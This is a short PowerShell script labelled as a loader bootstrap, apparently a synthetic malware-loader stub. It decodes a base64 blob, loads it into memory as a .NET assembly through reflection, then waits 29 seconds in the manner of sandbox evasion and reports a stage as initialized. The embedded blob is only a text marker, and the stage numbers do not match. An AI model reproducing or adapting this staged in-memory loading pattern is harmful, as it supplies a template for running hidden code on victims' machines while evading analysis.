
<# Loader bootstrap #> $ManagedBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjowYXEyZzVzZDJx"); $OperationResult = [Reflection.Assembly]::Load($ManagedBytes); $OperationResult.GetTypes().Count; Start-Sleep -Seconds 29; Write-Output "stage 8 initialized"
